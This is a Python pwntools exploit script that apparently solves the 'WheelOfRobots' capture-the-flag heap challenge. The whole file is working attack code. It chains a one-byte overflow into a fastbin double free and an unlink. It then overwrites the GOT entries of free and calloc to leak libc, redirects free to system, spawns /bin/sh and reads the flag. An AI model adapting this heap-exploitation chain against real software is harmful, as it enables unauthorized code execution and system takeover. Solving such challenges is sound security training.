from pwn import *

#context.log_level="debug"

s=process('./WheelOfRobots')
e=ELF('./WheelOfRobots')

bss = 0x6030F0

def Add(Choice, Value=""):
	s.sendline("1")
	s.recv()
	s.sendline(Choice)
	s.recv()
	if(Choice=="2" or Choice=="3" or Choice=="6"):
		s.sendline(Value)
		s.recv()

def Delete(Choice):
	s.sendline("2")
	s.recv()
	s.sendline(Choice)
	s.recv()

def Change(Choice, Name):
	s.sendline("3")
	s.recv()
	s.sendline(Choice)
	s.recv()
	s.send(Name)
	s.recv()

def Start():
	s.sendline("4")
	s.recv()

def Change_flag(value):
	s.sendline("1")
	s.recv()
	s.send("\x00"*4+value)
	s.recv()

def leak_libc(Choice):
	s.sendline("2")
	s.recv()
	s.sendline(Choice)
	leak = u64(s.recv(6)+"\x00"*2)
	return leak

def Shell(Choice):
	s.sendline("2")
	s.recv()
	s.sendline("4")

s.recv()
Add("2", "2") # calloc(40)
Add("4") # calloc(4000)
Delete("2")

Add("5") #callof(40000) -> fastbin_dup_consolidate
Delete("5")

Change_flag("\x01") # 1 byte overflow to trigger double_free
Delete("2")

Add("2", "2") # fastbin
Change("2", p64(0)*2+p64(bss-0x18)+p64(bss-0x10)+p64(0x20)) # unlink
Delete("4") 

Add("4") 

Change("2", p64(0)+p64(e.got['free']))
Change("4", p64(e.plt['puts'])) # got overwrite free->puts
Change("2", p64(0)+p64(e.got['read'])) # puts(read)

leak = leak_libc("4")
libc = leak - 0xf7250
system = libc + 0x45390

print 'leak   : ' + str(hex(leak))
print 'libc   : ' + str(hex(libc))
print 'system : ' + str(hex(system))

Add("4")

Change("2", p64(0)+p64(e.got['free']))
Change("4", p64(system)) # got overwrite free->system

Change("2", p64(0)+p64(e.got['calloc']))
Change("4", "/bin/sh;") # got overwrite calloc->/bin/sh;

Shell("4")
s.sendline("cat flag")

s.interactive()
